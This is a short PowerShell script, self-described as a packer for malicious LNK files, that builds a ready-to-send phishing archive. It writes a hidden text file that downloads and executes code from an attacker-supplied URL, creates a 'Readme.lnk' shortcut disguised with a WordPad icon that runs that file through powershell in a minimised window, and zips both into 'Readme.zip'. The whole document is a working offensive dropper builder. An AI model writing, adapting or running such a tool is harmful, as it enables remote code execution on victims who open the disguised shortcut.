[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [string]$Url
)

$packmylnk = @"
      
PackMyLNK - A simple .zip packer for malicious LNK files
calfcrusher@inventati.org

"@

$packmylnk

$curDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
$lnk = Join-Path -Path $curDir -ChildPath "Readme.lnk"
$ps1 = Join-Path -Path $curDir -ChildPath "backup.txt"

New-Item -Path $ps1 -ItemType File -Force | Out-Null
$runAll = "Invoke-Expression (Invoke-WebRequest $Url)"
Set-Content -Path $ps1 -Value $runAll
attrib +h $ps1

$obj = New-object -ComObject wscript.shell
$link = $obj.createshortcut($lnk)
$link.windowstyle = "7"
$link.targetpath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$link.arguments = "Get-Content $ps1 | Invoke-Expression"
$link.iconlocation = "C:\Program Files (x86)\Windows NT\Accessories\WordPad.exe"
$link.save()

$zipFile = Join-Path -Path $curDir -ChildPath "Readme.zip"
Set-Content $zipFile ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))

$shell = New-Object -ComObject Shell.Application

$zipFolder = $shell.NameSpace($zipFile)

$acl = Get-Acl $zipFile
$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
    [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
    "FullControl",
    "Allow"
)
$acl.SetAccessRule($accessRule)
Set-Acl -Path $zipFile -AclObject $acl

$zipFolder.MoveHere($lnk)
$zipFolder.MoveHere($ps1)

Write-Host "ZIP file created: $zipFile"
